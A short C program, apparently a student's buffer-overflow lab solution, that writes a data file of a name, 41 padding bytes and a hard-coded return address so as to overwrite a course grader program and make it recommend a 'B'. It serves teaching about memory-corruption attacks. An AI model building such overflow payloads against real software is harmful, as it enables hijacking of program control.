/*-------------------------------------------------------------------*/
/* createdataB.c                                                     */
/* Authors: Payton Croskey and Kakuyon Mataeh                        */
/* Precept: P05
/*-------------------------------------------------------------------*/
#include <stdio.h>

/* This function creates file dataB that can be used to overwrite the
grader program and recommend a grade of 'B'*/

int main(void) {
   FILE *psfile;
   unsigned long ulData;
   int i;
   psfile = fopen("dataB", "w");

   fprintf(psfile,"%s","Kapayon");

   for (i = 0; i < 41; i++)
      putc(0x00, psfile); /* Writes 00000000 */
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psfile);

   fclose(psfile);
   return 0;
}
